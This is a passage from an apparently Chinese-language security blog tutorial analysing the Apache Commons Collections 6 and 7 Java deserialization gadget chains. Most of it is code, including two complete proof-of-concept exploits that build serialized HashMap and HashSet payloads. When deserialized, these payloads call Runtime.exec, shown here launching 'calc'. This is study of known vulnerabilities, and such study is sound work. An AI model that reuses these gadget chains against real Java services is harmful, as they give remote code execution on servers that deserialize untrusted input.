class_">ConstantTransformer</span>(String.class)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//这是真的transformer</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;leihehe&quot;</span>);<span class="comment">//让TiedMapEntry里的map为lazyMap,key随意</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">serMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        serMap.put(tiedMapEntry,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 把有用的transformer换回来 */</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">myTransformers</span> <span class="operator">=</span> chainedTransformer.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        myTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        myTransformers.set(chainedTransformer,transformers);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(serMap);<span class="comment">//序列化</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//只需要readObject()就会触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>奇怪的是，序列化时不弹计算器了，可是反序列化的时候也没有弹计算器 -》 我们没有成功触发漏洞。</p>
<p>问题出在哪里呢？</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204162857604.png" alt="image-20211204162857604"></p>
<p>我们发现执行到<code>putForCreate</code>的时候，被传过去的key值是<code>TiedMapEntry</code>中的key值，而并非我们想要的<code>tiedMapEntry</code>，所以我们猜测某个地方将<code>TiedMapEntry</code>中的key值给加到map里去了。</p>
<p>跟踪后发现问题出在<strong>LazyMap.get():</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里我们的factory是<code>fakeTransform</code>,key是<code>leihehe</code>，在<code>super.map.put(key, value);</code>处，TiedMapEntry被添加了一个key值</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204183033871.png" alt="image-20211204183033871"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204183536474.png" alt="image-20211204183536474"></p>
<p>导致反序列化漏洞触发失败。</p>
<p>所以我们的<strong>解决方法</strong>如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyMap.remove(<span class="string">&quot;leihehe&quot;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//写一个fake的trasnformers</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//这是真的transformer</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;leihehe&quot;</span>);<span class="comment">//让TiedMapEntry里的map为lazyMap,key随意</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">serMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        serMap.put(tiedMapEntry,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">        <span class="comment">/* 把有用的transformer换回来 */</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">myTransformers</span> <span class="operator">=</span> chainedTransformer.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        myTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        myTransformers.set(chainedTransformer,transformers);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(serMap);<span class="comment">//序列化</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//只需要readObject()就会触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204184034975.png" alt="image-20211204184034975"></p>
<h4 id="调用hash-处二（方法二）："><a href="#调用hash-处二（方法二）：" class="headerlink" title="调用hash()处二（方法二）："></a>调用hash()处二（方法二）：</h4><h5 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h5><p>经过分析，我们发现<code>HashMap.put()</code>方法也会导致利用链触发（也正是它给我们在方法一的实现中带来了坑）</p>
<p>那么我们有没有什么办法直接让程序call到<code>HashMap.put()</code>，就让它成为利用链中一部分呢？</p>
<p><code>HashSet</code>成为了我们的首选。</p>
<h5 id="HashSet-readObject"><a href="#HashSet-readObject" class="headerlink" title="HashSet.readObject()"></a>HashSet.readObject()</h5><p>我们发现<code>HashSet.readObject()</code>中call 到了put()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in HashMap capacity and load factor and create backing HashMap</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 此处判断是否为LinkedHashSet类型，如果不是就创建HashMap */</span></span><br><span class="line">    map = (((HashSet)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in size</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);<span class="comment">//这里call到了put</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们能让<code>map</code>变量为我们的HashMap就能连上了。我们发现在该方法下会重建一个新的map，而这个map就是<strong>HashMap</strong>类型。 如果我们直接把这个内部的<strong>HashMap</strong>拿来用，把这个内部的<strong>HashMap</strong>的key值改为<strong>tiedMapEntry</strong>，当他被call <code>put()</code>的时候，利用链就能被成功执行了。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211205094232431.png" alt="image-20211205094232431"></p>
<p>我们跟到<code>HashSet.readObject()</code>看一下，看看这个<code>e</code>是怎么来的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">    <span class="comment">// Write out any hidden serialization magic</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out HashMap capacity and load factor</span></span><br><span class="line">    s.writeInt(map.capacity());</span><br><span class="line">    s.writeFloat(map.loadFactor());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out size</span></span><br><span class="line">    s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (E e : map.keySet())<span class="comment">//e是通过hashmap的keySet来的</span></span><br><span class="line">        s.writeObject(e);<span class="comment">//e被序列化了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就很明显了，它会把变量<code>map</code>里的<code>key-value</code>对给序列化，如果我们变量<code>map</code>已经有值，那么它的内容就会被序列化 -》从而在readObject()反序列化的时候这些内容又会被反序列化从而触发漏洞 -》 这里引出后面的用反射修改<code>map</code>。</p>
<h5 id="HashSet-add"><a href="#HashSet-add" class="headerlink" title="HashSet.add()"></a>HashSet.add()</h5><p><code>HashSet.add()</code>会向map(hashmap)中添加一个key</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.put(e, PRESENT)==<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="POC构造-1"><a href="#POC构造-1" class="headerlink" title="POC构造"></a>POC构造</h5><p>我们已经得知，HashSet中会生成一个HashMap，所以我们不再需要自己构造了HashMap了。我们的思路如下：先用hashSet生成一个带任意key值的hashMap，我们用反射的方式得到这个map，最后再用反射的方式从这个<strong>map</strong>中修改<strong>key</strong>。</p>
<p>在HashMap中，键值对是被存储在<code>table</code>变量中的，这个看代码直接能看出来。</p>
<p><strong>完整POC如下</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6Method2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//这是真的transformer</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;leihehe&quot;</span>);<span class="comment">//让TiedMapEntry里的map为lazyMap,key随意</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建HashSet的时候，其内部已经创建了一个hashmap，我们只需要把这个内部生成的hashmap的key值改为tiedMapEntry，当他被call put的时候，利用链就成功执行了。</span></span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashSet.add(<span class="string">&quot;111&quot;</span>);<span class="comment">//先随意给内部的map添加一个key</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">map</span> <span class="operator">=</span> hashSet.getClass().getDeclaredField(<span class="string">&quot;map&quot;</span>);<span class="comment">//得到这个map Field</span></span><br><span class="line">        map.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">mapInHashSet</span> <span class="operator">=</span> (HashMap) map.get(hashSet);<span class="comment">//得到这个map的内容 -》也就是hashMap</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> mapInHashSet.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);<span class="comment">//从这个hashmap中获取table field</span></span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[]) table.get(mapInHashSet);<span class="comment">//这个table field里面包含了由各种键值对组成的数组</span></span><br><span class="line">        <span class="comment">// 我们的目的是修改那个我们之前放进去的key值，让他等于tiedMapEntry</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (Object i : array)&#123;<span class="comment">//遍历这个键值对数组，如果不为空，就赋值给node，从而得到一对键值对</span></span><br><span class="line">            <span class="keyword">if</span>(i!=<span class="literal">null</span>)&#123;</span><br><span class="line">                node=i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 修改其中的key值 */</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashSet);<span class="comment">//序列化</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//只需要readObject()就会触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>cc6中用<code>fakeTransformer</code>来绕过命令重复执行可以说是非常好的思路了，自己在审计的时候也可以学习这方面思路。</p>
<h3 id="Reference-4"><a href="#Reference-4" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.anquanke.com/post/id/233410#h3-8">ysoserial CommonsCollections5/6 详细分析</a></p>
<p><a href="https://reader-l.github.io/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">Java安全-CommonsCollections6利用链分析</a></p>
<h2 id="Commons-Collections-7"><a href="#Commons-Collections-7" class="headerlink" title="Commons Collections 7"></a>Commons Collections 7</h2><h3 id="环境搭建-6"><a href="#环境搭建-6" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li>commons-collections:3.1-3.2.1</li>
<li>jdk1.7</li>
</ul>
<h3 id="利用链构造-3"><a href="#利用链构造-3" class="headerlink" title="利用链构造"></a>利用链构造</h3><h4 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h4><p><code>LazyMap.get()</code>之后得步骤和之前的cc链都差不多，这里就不再说了。</p>
<h4 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals()"></a>AbstractMap.equals()</h4><p>我们在<code>AbstractMap.equals()</code>中发现了<code>.get()</code>方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206194914358.png" alt="image-20211206194914358"></p>
<p>如果我们能够控制变量<code>m</code>为lazyMap的话，就能连上利用链了。</p>
<p>那么什么调用了<code>AbstractMap.equals()</code>呢？</p>
<h4 id="Hashtable-reconstitutionPut"><a href="#Hashtable-reconstitutionPut" class="headerlink" title="Hashtable.reconstitutionPut()"></a>Hashtable.reconstitutionPut()</h4><p>我们发现在<code>Hashtable</code>中，<code>reconstitutionPut()</code>方法调用了<code>e.key.equals()</code>，既然我们想要call到<code>AbstractMap.equals()</code>,那我们让传入的<strong>e.key</strong>变成<code>AbstractMap</code>是不是就可以了呢？</p>
